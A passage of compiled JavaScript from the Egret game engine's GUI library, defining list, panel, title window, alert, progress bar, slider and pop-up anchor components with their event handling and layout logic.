				null != b && (b.removeEventListener(d.TouchEvent.TOUCH_ROLL_OVER, this.item_mouseEventHandler, this), b.removeEventListener(d.TouchEvent.TOUCH_ROLL_OUT, this.item_mouseEventHandler, this))
			};
			a.prototype.item_mouseEventHandler = function (b) {
				var c = b.type,
				c = a.TYPE_MAP[c];
				this.hasEventListener(c) && this._dispatchListEvent(b, c, b.currentTarget)
			};
			a.prototype._dispatchListEvent = function (b, a, c) {
				var d = -1,
				d = c ? c.itemIndex : this.dataGroup.getElementIndex(b.currentTarget),
				f = this.dataProvider.getItemAt(d);
				e.ListEvent.dispatchListEvent(this, a, b, d, f, c)
			};
			a.prototype.dataProvider_collectionChangeHandler = function (b) {
				var c = b.items;
				if (b.kind == e.CollectionEventKind.ADD)
					for (var c = c.length, d = 0; d < c; d++)
						this.itemAdded(b.location + d);
				else if (b.kind == e.CollectionEventKind.REMOVE)
					for (c = c.length, d = c - 1; 0 <= d; d--)
						this.itemRemoved(b.location + d);
				else
					b.kind == e.CollectionEventKind.MOVE ? (this.itemRemoved(b.oldLocation), this.itemAdded(b.location)) : b.kind == e.CollectionEventKind.RESET ? 0 == this.dataProvider.length ? this._setSelectedIndex(a.NO_SELECTION,
						!1) : (this.dataProviderChanged = !0, this.invalidateProperties()) : b.kind == e.CollectionEventKind.REFRESH && this._setSelectedIndex(a.NO_SELECTION, !1)
			};
			a.NO_SELECTION = -1;
			a.NO_PROPOSED_SELECTION = -2;
			a.CUSTOM_SELECTED_ITEM = -3;
			a.TYPE_MAP = {
				rollOver : "itemRollOver",
				rollOut : "itemRollOut"
			};
			return a
		}
		(e.SkinnableDataContainer);
		e.ListBase = f;
		f.prototype.__class__ = "egret.gui.ListBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._title = "";
				this.hostComponentKey = "egret.gui.Panel";
				this.touchEnabled = !1
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "title", {
				get : function () {
					return this._title
				},
				set : function (b) {
					this._title = b;
					this.titleDisplay && (this.titleDisplay.text = this.title)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.titleDisplay && (this.titleDisplay.text = this.title)
			};
			return a
		}
		(d.SkinnableContainer);
		d.Panel = f;
		f.prototype.__class__ = "egret.gui.Panel"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._autoBackToStage = this._showCloseButton = !0;
				this.hostComponentKey = "egret.gui.TitleWindow";
				this.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.onWindowMouseDown, this, !0, 100)
			}
			__extends(a, c);
			a.prototype.onWindowMouseDown = function (b) {
				this.enabled && this.isPopUp && b.target != this.closeButton && e.PopUpManager.bringToFront(this)
			};
			Object.defineProperty(a.prototype, "showCloseButton", {
				get : function () {
					return this._showCloseButton
				},
				set : function (b) {
					this._showCloseButton !=
					b && (this._showCloseButton = b, this.closeButton && (this.closeButton.visible = this._showCloseButton))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "autoBackToStage", {
				get : function () {
					return this._autoBackToStage
				},
				set : function (b) {
					this._autoBackToStage = b
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.moveArea ? this.moveArea.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.moveArea_mouseDownHandler, this) : a == this.closeButton &&
				(this.closeButton.addEventListener(d.TouchEvent.TOUCH_TAP, this.closeButton_clickHandler, this), this.closeButton.visible = this._showCloseButton)
			};
			a.prototype.partRemoved = function (b, a) {
				c.prototype.partRemoved.call(this, b, a);
				a == this.moveArea ? this.moveArea.removeEventListener(d.TouchEvent.TOUCH_BEGIN, this.moveArea_mouseDownHandler, this) : a == this.closeButton && this.closeButton.removeEventListener(d.TouchEvent.TOUCH_TAP, this.closeButton_clickHandler, this)
			};
			a.prototype.closeButton_clickHandler = function (b) {
				e.CloseEvent.dispatchCloseEvent(this,
					e.CloseEvent.CLOSE)
			};
			a.prototype.moveArea_mouseDownHandler = function (b) {
				this.enabled && this.isPopUp && (b = this.globalToLocal(b.stageX, b.stageY, d.Point.identity), this._offsetPointX = b.x, this._offsetPointY = b.y, this._includeInLayout = !1, e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_MOVE, this.moveArea_mouseMoveHandler, this), e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_END, this.moveArea_mouseUpHandler, this), e.UIGlobals.stage.addEventListener(d.Event.LEAVE_STAGE, this.moveArea_mouseUpHandler,
						this))
			};
			a.prototype.moveArea_mouseMoveHandler = function (b) {
				b = this.globalToLocal(b.stageX, b.stageY, d.Point.identity);
				this.x += b.x - this._offsetPointX;
				this.y += b.y - this._offsetPointY
			};
			a.prototype.moveArea_mouseUpHandler = function (b) {
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_MOVE, this.moveArea_mouseMoveHandler, this);
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.moveArea_mouseUpHandler, this);
				e.UIGlobals.stage.removeEventListener(d.Event.LEAVE_STAGE, this.moveArea_mouseUpHandler,
					this);
				this._autoBackToStage && this.adjustPosForStage();
				e.LayoutUtil.adjustRelativeByXY(this);
				this.includeInLayout = !0
			};
			a.prototype.adjustPosForStage = function () {
				if (this.moveArea && this.stage) {
					var b = this.moveArea.localToGlobal(0, 0),
					a = b.x,
					c = b.y;
					35 > b.x + this.moveArea.width && (a = 35 - this.moveArea.width);
					b.x > this.stage.stageWidth - 20 && (a = this.stage.stageWidth - 20);
					20 > b.y + this.moveArea.height && (c = 20 - this.moveArea.height);
					b.y > this.stage.stageHeight - 20 && (c = this.stage.stageHeight - 20);
					this.x += a - b.x;
					this.y += c - b.y
				}
			};
			return a
		}
		(e.Panel);
		e.TitleWindow = f;
		f.prototype.__class__ = "egret.gui.TitleWindow"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._contentText = this._secondButtonLabel = this._firstButtonLabel = "";
				this.hostComponentKey = "egret.gui.Alert"
			}
			__extends(a, c);
			a.show = function (b, c, d, f, h, g, l) {
				"undefined" === typeof b && (b = "");
				"undefined" === typeof c && (c = "");
				"undefined" === typeof d && (d = null);
				"undefined" === typeof f && (f = "\u786e\u5b9a");
				"undefined" === typeof h && (h = "");
				"undefined" === typeof g && (g = !0);
				"undefined" === typeof l && (l = !0);
				var k = new a;
				k.contentText = b;
				k.title = c;
				k._firstButtonLabel =
					f;
				k._secondButtonLabel = h;
				k.closeHandler = d;
				e.PopUpManager.addPopUp(k, g, l);
				return k
			};
			Object.defineProperty(a.prototype, "firstButtonLabel", {
				get : function () {
					return this._firstButtonLabel
				},
				set : function (b) {
					this._firstButtonLabel != b && (this._firstButtonLabel = b, this.firstButton && (this.firstButton.label = b))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "secondButtonLabel", {
				get : function () {
					return this._secondButtonLabel
				},
				set : function (b) {
					this._secondButtonLabel != b && (this._secondButtonLabel =
							b, !this.secondButton || null != b && "" != b || (this.secondButton.includeInLayout = this.secondButton.visible = "" != this._secondButtonLabel && null != this._secondButtonLabel))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "contentText", {
				get : function () {
					return this._contentText
				},
				set : function (b) {
					this._contentText != b && (this._contentText = b, this.contentDisplay && (this.contentDisplay.text = b))
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.onClose = function (b) {
				e.PopUpManager.removePopUp(this);
				if (null != this.closeHandler) {
					var c =
						new e.CloseEvent(e.CloseEvent.CLOSE);
					switch (b.currentTarget) {
					case this.firstButton:
						c.detail = a.FIRST_BUTTON;
						break;
					case this.secondButton:
						c.detail = a.SECOND_BUTTON
					}
					this.closeHandler(c)
				}
			};
			a.prototype.closeButton_clickHandler = function (b) {
				c.prototype.closeButton_clickHandler.call(this, b);
				e.PopUpManager.removePopUp(this);
				b = new e.CloseEvent(e.CloseEvent.CLOSE, !1, !1, a.CLOSE_BUTTON);
				null != this.closeHandler && this.closeHandler(b)
			};
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.contentDisplay ?
				this.contentDisplay.text = this._contentText : a == this.firstButton ? (this.firstButton.label = this._firstButtonLabel, this.firstButton.addEventListener(d.TouchEvent.TOUCH_TAP, this.onClose, this)) : a == this.secondButton && (this.secondButton.label = this._secondButtonLabel, this.secondButton.includeInLayout = this.secondButton.visible = "" != this._secondButtonLabel && null != this._secondButtonLabel, this.secondButton.addEventListener(d.TouchEvent.TOUCH_TAP, this.onClose, this))
			};
			a.prototype.partRemoved = function (b, a) {
				c.prototype.partRemoved.call(this,
					b, a);
				a == this.firstButton ? this.firstButton.removeEventListener(d.TouchEvent.TOUCH_TAP, this.onClose, this) : a == this.secondButton && this.secondButton.removeEventListener(d.TouchEvent.TOUCH_TAP, this.onClose, this)
			};
			a.FIRST_BUTTON = "firstButton";
			a.SECOND_BUTTON = "secondButton";
			a.CLOSE_BUTTON = "closeButton";
			return a
		}
		(e.TitleWindow);
		e.Alert = f;
		f.prototype.__class__ = "egret.gui.Alert"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._slideDuration = 500;
				this._direction = e.ProgressBarDirection.LEFT_TO_RIGHT;
				this.animationValue = 0;
				this.trackResizedOrMoved = !1;
				this.hostComponentKey = "egret.gui.ProgressBar"
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "labelFunction", {
				get : function () {
					return this._labelFunction
				},
				set : function (b) {
					this._labelFunction != b && (this._labelFunction = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.valueToLabel =
			function (b, a) {
				return null != this.labelFunction ? this._labelFunction(b, a) : b + " / " + a
			};
			Object.defineProperty(a.prototype, "slideDuration", {
				get : function () {
					return this._slideDuration
				},
				set : function (b) {
					this._slideDuration != b && (this._slideDuration = b, this.animator && this.animator.isPlaying && (this.animator.stop(), this._setValue(this.slideToValue)))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "direction", {
				get : function () {
					return this._direction
				},
				set : function (b) {
					this._direction != b && (this._direction =
							b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "value", {
				get : function () {
					return this._getValue()
				},
				set : function (b) {
					this._getValue() != b && (this._setValue(b), 0 < this._slideDuration && this.stage ? (this.validateProperties(), this.animator || (this.animator = new e.Animation(this.animationUpdateHandler, this)), this.animator.isPlaying && (this.animationValue = this.slideToValue, this.invalidateDisplayList(), this.animator.stop()), this.slideToValue = this.nearestValidValue(b,
									this.snapInterval), this.slideToValue != this.animationValue && (b = this._slideDuration * (Math.abs(this.animationValue - this.slideToValue) / (this.maximum - this.minimum)), this.animator.duration = Infinity === b ? 0 : b, this.animator.motionPaths = [{
										prop : "value",
										from : this.animationValue,
										to : this.slideToValue
									}
								], this.animator.play())) : this.animationValue = this._getValue())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.animationUpdateHandler = function (b) {
				b = this.nearestValidValue(b.currentValue.value, this.snapInterval);
				this.animationValue =
					Math.min(this.maximum, Math.max(this.minimum, b));
				this.invalidateDisplayList()
			};
			a.prototype.setValue = function (b) {
				c.prototype.setValue.call(this, b);
				this.invalidateDisplayList()
			};
			a.prototype.updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this, b, a);
				this.updateSkinDisplayList()
			};
			a.prototype.partAdded = function (b, a) {
				a == this.track && this.track instanceof e.UIComponent && (this.track.addEventListener(e.ResizeEvent.RESIZE, this.onTrackResizeOrMove, this), this.track.addEventListener(e.MoveEvent.MOVE,
						this.onTrackResizeOrMove, this))
			};
			a.prototype.partRemoved = function (b, a) {
				a == this.track && this.track instanceof e.UIComponent && (this.track.removeEventListener(e.ResizeEvent.RESIZE, this.onTrackResizeOrMove, this), this.track.removeEventListener(e.MoveEvent.MOVE, this.onTrackResizeOrMove, this))
			};
			a.prototype.onTrackResizeOrMove = function (b) {
				this.trackResizedOrMoved = !0;
				this.invalidateProperties()
			};
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this.trackResizedOrMoved && (this.trackResizedOrMoved =
						!1, this.updateSkinDisplayList())
			};
			a.prototype.updateSkinDisplayList = function () {
				this.trackResizedOrMoved = !1;
				var b = this.value;
				this.animator && this.animator.isPlaying ? b = this.animationValue : (b = this.value, isNaN(b) && (b = 0));
				var a = isNaN(this.maximum) ? 0 : this.maximum;
				if (this.thumb && this.track) {
					var c = isNaN(this.track.width) ? 0 : this.track.width,
					c = c * this.track.scaleX,
					f = isNaN(this.track.height) ? 0 : this.track.height,
					f = f * this.track.scaleY,
					h = Math.round(b / a * c);
					if (isNaN(h) || 0 > h || Infinity === h)
						h = 0;
					var g = Math.round(b / a * f);
					if (isNaN(g) || 0 > g || Infinity === g)
						g = 0;
					var l = this.track.localToGlobal(0, 0),
					k = this.globalToLocal(l.x, l.y, d.Point.identity),
					l = k.x,
					k = k.y;
					switch (this._direction) {
					case e.ProgressBarDirection.LEFT_TO_RIGHT:
						this.thumb.width = h;
						this.thumb.height = f;
						this.thumb.x = l;
						break;
					case e.ProgressBarDirection.RIGHT_TO_LEFT:
						this.thumb.width = h;
						this.thumb.height = f;
						this.thumb.x = l + c - h;
						break;
					case e.ProgressBarDirection.TOP_TO_BOTTOM:
						this.thumb.width = c;
						this.thumb.height = g;
						this.thumb.y = k;
						break;
					case e.ProgressBarDirection.BOTTOM_TO_TOP:
						this.thumb.width =
							c,
						this.thumb.height = g,
						this.thumb.y = k + f - g
					}
				}
				this.labelDisplay && (this.labelDisplay.text = this.valueToLabel(b, a))
			};
			return a
		}
		(e.Range);
		e.ProgressBar = f;
		f.prototype.__class__ = "egret.gui.ProgressBar"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.LEFT_TO_RIGHT = "leftToRight";
			c.RIGHT_TO_LEFT = "rightToLeft";
			c.TOP_TO_BOTTOM = "topToBottom";
			c.BOTTOM_TO_TOP = "bottomToTop";
			return c
		}
		();
		d.ProgressBarDirection = f;
		f.prototype.__class__ = "egret.gui.ProgressBarDirection"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.hostComponentKey = "egret.gui.HSlider"
			}
			__extends(a, c);
			a.prototype.pointToValue = function (b, a) {
				if (!this.thumb || !this.track)
					return 0;
				var c = this.maximum - this.minimum,
				d = this.track.layoutBoundsWidth - this.thumb.layoutBoundsWidth;
				return this.minimum + (0 != d ? b / d * c : 0)
			};
			a.prototype.updateSkinDisplayList = function () {
				if (this.thumb && this.track) {
					var b = this.track.layoutBoundsWidth - this.thumb.layoutBoundsWidth,
					a = this.maximum - this.minimum,
					b = 0 < a ?
						(this.pendingValue - this.minimum) / a * b : 0,
					c = this.track.localToGlobal(b, 0),
					a = c.x,
					c = c.y,
					e = this.thumb.parent.globalToLocal(a, c, d.Point.identity).x;
					this.thumb.setLayoutBoundsPosition(Math.round(e), this.thumb.layoutBoundsY);
					this.showTrackHighlight && this.trackHighlight && this.trackHighlight.parent && (a = this.trackHighlight.parent.globalToLocal(a, c, d.Point.identity).x - b, this.trackHighlight.x = Math.round(a), this.trackHighlight.width = Math.round(b))
				}
			};
			return a
		}
		(e.SliderBase);
		e.HSlider = f;
		f.prototype.__class__ = "egret.gui.HSlider"
	})(d.gui ||
		(d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.hostComponentKey = "egret.gui.VSlider"
			}
			__extends(a, c);
			a.prototype.pointToValue = function (b, a) {
				if (!this.thumb || !this.track)
					return 0;
				var c = this.maximum - this.minimum,
				d = this.track.layoutBoundsHeight - this.thumb.layoutBoundsHeight;
				return this.minimum + (0 != d ? (d - a) / d * c : 0)
			};
			a.prototype.updateSkinDisplayList = function () {
				if (this.thumb && this.track) {
					var b = this.thumb.layoutBoundsHeight,
					a = this.track.layoutBoundsHeight - b,
					c = this.maximum - this.minimum,
					e = this.track.localToGlobal(0, 0 < c ? a - (this.pendingValue - this.minimum) / c * a : 0),
					c = e.x,
					e = e.y,
					f = this.thumb.parent.globalToLocal(c, e, d.Point.identity).y;
					this.thumb.setLayoutBoundsPosition(this.thumb.layoutBoundsX, Math.round(f));
					this.showTrackHighlight && this.trackHighlight && this.trackHighlight._parent && (c = this.trackHighlight._parent.globalToLocal(c, e, d.Point.identity).y, this.trackHighlight.y = Math.round(c + b), this.trackHighlight.height = Math.round(a - c))
				}
			};
			return a
		}
		(e.SliderBase);
		e.VSlider = f;
		f.prototype.__class__ =
			"egret.gui.VSlider"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._allowMultipleSelection = !1;
				this._selectedIndices = [];
				this._captureItemRenderer = !0;
				this.hostComponentKey = "egret.gui.List";
				this.useVirtualLayout = !0
			}
			__extends(a, c);
			a.prototype.createChildren = function () {
				this.itemRenderer || (this.itemRenderer = e.DataGroup.defaultRendererFactory);
				c.prototype.createChildren.call(this)
			};
			Object.defineProperty(a.prototype, "useVirtualLayout", {
				get : function () {
					return this._getUseVirtualLayout()
				},
				set : function (b) {
					this._setUseVirtualLayout(b)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "allowMultipleSelection", {
				get : function () {
					return this._allowMultipleSelection
				},
				set : function (b) {
					this._allowMultipleSelection = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "selectedIndices", {
				get : function () {
					return this._proposedSelectedIndices ? this._proposedSelectedIndices : this._selectedIndices
				},
				set : function (b) {
					this._setSelectedIndices(b, !1)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "selectedIndex", {
				get : function () {
					return this._proposedSelectedIndices ? 0 < this._proposedSelectedIndices.length ? this._proposedSelectedIndices[0] : -1 : this._getSelectedIndex()
				},
				set : function (b) {
					this._setSelectedIndex(b)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "selectedItems", {
				get : function () {
					var b = [],
					a = this.selectedIndices;
					if (a)
						for (var c = a.length, d = 0; d < c; d++)
							b[d] = this.dataProvider.getItemAt(a[d]);
					return b
				},
				set : function (b) {
					var a = [];
					if (b)
						for (var c = b.length, d = 0; d < c; d++) {
							var e = this.dataProvider.getItemIndex(b[d]);
							-1 != e && a.splice(0, 0, e);
							if (-1 == e) {
								a = [];
								break
							}
						}
					this._setSelectedIndices(a, !1)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setSelectedIndices = function (b, a) {
				"undefined" === typeof a && (a = !1);
				a && (this._dispatchChangeAfterSelection = this._dispatchChangeAfterSelection || a);
				this._proposedSelectedIndices = b ? b : [];
				this.invalidateProperties()
			};
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this._proposedSelectedIndices && this.commitSelection()
			};
			a.prototype.commitSelection = function (b) {
				"undefined" ===
				typeof b && (b = !0);
				var a = this._selectedIndex;
				if (this._proposedSelectedIndices) {
					this._proposedSelectedIndices = this._proposedSelectedIndices.filter(this.isValidIndex);
					if (!this.allowMultipleSelection && 0 < this._proposedSelectedIndices.length) {
						var d = [];
						d.push(this._proposedSelectedIndices[0]);
						this._proposedSelectedIndices = d
					}
					this._proposedSelectedIndex = 0 < this._proposedSelectedIndices.length ? this._proposedSelectedIndices[0] : -1
				}
				d = c.prototype.commitSelection.call(this, !1);
				if (!d)
					return this._proposedSelectedIndices =
						null, !1;
				this.selectedIndex > e.ListBase.NO_SELECTION && (this._proposedSelectedIndices ? -1 == this._proposedSelectedIndices.indexOf(this.selectedIndex) && this._proposedSelectedIndices.push(this.selectedIndex) : this._proposedSelectedIndices = [this.selectedIndex]);
				this._proposedSelectedIndices && (-1 != this._proposedSelectedIndices.indexOf(a) && this.itemSelected(a, !0), this.commitMultipleSelection());
				b && d && (this._dispatchChangeAfterSelection && (e.IndexChangeEvent.dispatchIndexChangeEvent(this, e.IndexChangeEvent.CHANGE,
							a, this._selectedIndex), this._dispatchChangeAfterSelection = !1), e.UIEvent.dispatchUIEvent(this, e.UIEvent.VALUE_COMMIT));
				return d
			};
			a.prototype.isValidIndex = function (b, a, c) {
				return this.dataProvider && 0 <= b && b < this.dataProvider.length
			};
			a.prototype.commitMultipleSelection = function () {
				var b = [],
				a = [],
				c,
				d;
				if (0 < this._selectedIndices.length && 0 < this._proposedSelectedIndices.length) {
					d = this._proposedSelectedIndices.length;
					for (c = 0; c < d; c++)
						 - 1 == this._selectedIndices.indexOf(this._proposedSelectedIndices[c]) && a.push(this._proposedSelectedIndices[c]);
					d = this._selectedIndices.length;
					for (c = 0; c < d; c++)
						 - 1 == this._proposedSelectedIndices.indexOf(this._selectedIndices[c]) && b.push(this._selectedIndices[c])
				} else
					0 < this._selectedIndices.length ? b = this._selectedIndices : 0 < this._proposedSelectedIndices.length && (a = this._proposedSelectedIndices);
				this._selectedIndices = this._proposedSelectedIndices;
				if (0 < b.length)
					for (d = b.length, c = 0; c < d; c++)
						this.itemSelected(b[c], !1);
				if (0 < a.length)
					for (d = a.length, c = 0; c < d; c++)
						this.itemSelected(a[c], !0);
				this._proposedSelectedIndices =
					null
			};
			a.prototype._isItemIndexSelected = function (b) {
				return this._allowMultipleSelection ? -1 != this._selectedIndices.indexOf(b) : c.prototype._isItemIndexSelected.call(this, b)
			};
			a.prototype.dataGroup_rendererAddHandler = function (b) {
				c.prototype.dataGroup_rendererAddHandler.call(this, b);
				b = b.renderer;
				null != b && (b.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.item_mouseDownHandler, this), b.addEventListener(d.TouchEvent.TOUCH_END, this.item_mouseUpHandler, this))
			};
			a.prototype.dataGroup_rendererRemoveHandler = function (b) {
				c.prototype.dataGroup_rendererRemoveHandler.call(this,
					b);
				b = b.renderer;
				null != b && (b.removeEventListener(d.TouchEvent.TOUCH_BEGIN, this.item_mouseDownHandler, this), b.removeEventListener(d.TouchEvent.TOUCH_END, this.item_mouseUpHandler, this))
			};
			a.prototype.item_mouseDownHandler = function (b) {
				if (!b.isDefaultPrevented()) {
					var a = b.currentTarget,
					c;
					c = a ? a.itemIndex : this.dataGroup.getElementIndex(b.currentTarget);
					this._allowMultipleSelection ? this._setSelectedIndices(this.calculateSelectedIndices(c, b.shiftKey, b.ctrlKey), !0) : this._setSelectedIndex(c, !0);
					this._captureItemRenderer &&
					(this.mouseDownItemRenderer = a, e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler, this), e.UIGlobals.stage.addEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpHandler, this))
				}
			};
			a.prototype.calculateSelectedIndices = function (b, a, c) {
				var d = [];
				if (a)
					if (a = 0 < this._selectedIndices.length ? this._selectedIndices[this._selectedIndices.length - 1] : 0, a < b)
						for (; a <= b; a++)
							d.splice(0, 0, a);
					else
						for (; a >= b; a--)
							d.splice(0, 0, a);
				else if (c)
					if (0 < this._selectedIndices.length)
						if (1 == this._selectedIndices.length &&
							this._selectedIndices[0] == b) {
							if (!this.requireSelection)
								return d;
							d.splice(0, 0, this._selectedIndices[0])
						} else {
							c = !1;
							for (a = 0; a < this._selectedIndices.length; a++)
								this._selectedIndices[a] == b ? c = !0 : this._selectedIndices[a] != b && d.splice(0, 0, this._selectedIndices[a]);
							c || d.splice(0, 0, b)
						}
					else
						d.splice(0, 0, b);
				else
					d.splice(0, 0, b);
				return d
			};
			a.prototype.item_mouseUpHandler = function (b) {
				var a = b.currentTarget;
				a == this.mouseDownItemRenderer && this._dispatchListEvent(b, e.ListEvent.ITEM_CLICK, a)
			};
			a.prototype.stage_mouseUpHandler =
			function (b) {
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler, this);
				e.UIGlobals.stage.removeEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpHandler, this);
				this.mouseDownItemRenderer = null
			};
			return a
		}
		(e.ListBase);
		e.List = f;
		f.prototype.__class__ = "egret.gui.List"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._displayPopUp = this._popUpWidthMatchesAnchorWidth = this._popUpHeightMatchesAnchorHeight = this.addedToStage = this.popUpIsDisplayed = !1;
				this._popUpPosition = e.PopUpPosition.TOP_LEFT;
				this.inAnimation = !1;
				this.animator = null;
				this._openDuration = 250;
				this._closeDuration = 150;
				this.valueRange = 1;
				this.addEventListener(d.Event.ADDED_TO_STAGE, this.addedToStageHandler, this);
				this.addEventListener(d.Event.REMOVED_FROM_STAGE, this.removedFromStageHandler,
					this)
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "popUpHeightMatchesAnchorHeight", {
				get : function () {
					return this._popUpHeightMatchesAnchorHeight
				},
				set : function (b) {
					this._popUpHeightMatchesAnchorHeight != b && (this._popUpHeightMatchesAnchorHeight = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "popUpWidthMatchesAnchorWidth", {
				get : function () {
					return this._popUpWidthMatchesAnchorWidth
				},
				set : function (b) {
					this._popUpWidthMatchesAnchorWidth != b && (this._popUpWidthMatchesAnchorWidth =
							b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "displayPopUp", {
				get : function () {
					return this._displayPopUp
				},
				set : function (b) {
					this._displayPopUp != b && (this._displayPopUp = b, this.addOrRemovePopUp())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "popUp", {
				get : function () {
					return this._popUp
				},
				set : function (b) {
					this._popUp != b && (this._popUp = b, this.dispatchEventWith("popUpChanged"))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype,
				"popUpPosition", {
				get : function () {
					return this._popUpPosition
				},
				set : function (b) {
					this._popUpPosition != b && (this._popUpPosition = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this, b, a);
				this.applyPopUpTransform(b, a)
			};
			a.prototype.updatePopUpTransform = function () {
				this.applyPopUpTransform(this.width, this.height)
			};
			a.prototype.calculatePopUpPosition = function () {
				var b = d.Point.identity;
				switch (this._popUpPosition) {
				case e.PopUpPosition.BELOW:
					b.x =
						0;
					b.y = this.height;
					break;
				case e.PopUpPosition.ABOVE:
					b.x = 0;
					b.y = -this.popUp.layoutBoundsHeight;
					break;
				case e.PopUpPosition.LEFT:
					b.x = -this.popUp.layoutBoundsWidth;
					b.y = 0;
					break;
				case e.PopUpPosition.RIGHT:
					b.x = this.width;
					b.y = 0;
					break;
				case e.PopUpPosition.CENTER:
					b.x = 0.5 * (this.width - this.popUp.layoutBoundsWidth),
					b.y = 0.5 * (this.height - this.popUp.layoutBoundsHeight)
				}
				b = this.localToGlobal(b.x, b.y, b);
				return b = this.popUp.parent.globalToLocal(b.x, b.y, b)
			};
			Object.defineProperty(a.prototype, "openDuration", {
				get : function () {
					return this._openDuration
				},
				set : function (b) {
					this._openDuration = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "closeDuration", {
				get : function () {
					return this._closeDuration
				},
				set : function (b) {
					this._closeDuration = b
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.animationStartHandler = function (b) {
				this.inAnimation = !0;
